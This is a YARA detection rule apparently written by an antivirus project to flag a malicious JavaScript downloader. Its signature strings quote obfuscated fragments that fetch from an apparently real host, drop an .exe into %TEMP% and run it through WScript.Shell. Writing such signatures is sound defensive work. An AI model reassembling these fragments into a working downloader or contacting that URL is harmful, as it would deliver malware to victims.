rule sig_20160401_ad022924329f554e726b3c8414820b85 {
  meta:
    description = "datamaliciousorder - file 20160401_ad022924329f554e726b3c8414820b85.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "84216763b88295e17243de31d4656110bc9abbf1b2838b1c2c1281e9380b268a"

  strings:
    $s1  = "NqWhz[GrTi](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "var RltQlo = function KtEam() {return WScript[QtrOa](\"WScript\"+\".Shell\");}(), ZnrHzx = 11;" fullword ascii
    $s3  = "function SaXy(ArxXi, IkRo){IpqOfi = IpqOfi * 1; return ArxXi - IkRo;};" fullword ascii
    $s4  = "if (NqWhz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AePn() {return RltQlo[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LGGAmnl4Ani.ex\" + \"e\";};" fullword ascii
    $s6  = "function RfIwf(){return NaZs + \"\";};" fullword ascii
    $s7  = "function NyBij() {return ((JpEb == true) && (JpEb == TjgKb)) ? 1 : IpqOfi;};" fullword ascii
    $s8  = "var CxxXp = false;" fullword ascii
    $s9  = "return SaXy(WbaBh, RnKb);" fullword ascii
    $s10 = "function XodSjl(){return 23;};" fullword ascii
    $s11 = "TjgKb = true; " fullword ascii
    $s12 = "var TjgKb = false;" fullword ascii
    $s13 = "function NpnViv()" fullword ascii
    $s14 = "}while (TrDcc);" fullword ascii
    $s15 = "var WmFdg = new this[\"Date\"]();" fullword ascii
    $s16 = "function YiLa(CnXt){RltQlo[\"R\"+\"un\"](CnXt, IpqOfi, IpqOfi);};" fullword ascii
    $s17 = "function QdlFz(){return QtrOa;};" fullword ascii
    $s18 = "function OrQyn(XaGe) {var NxOe = (1, 2, 3, 4, 5, XaGe); return NxOe;};" fullword ascii
    $s19 = "JpEb = true; " fullword ascii
    $s20 = "var JpEb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}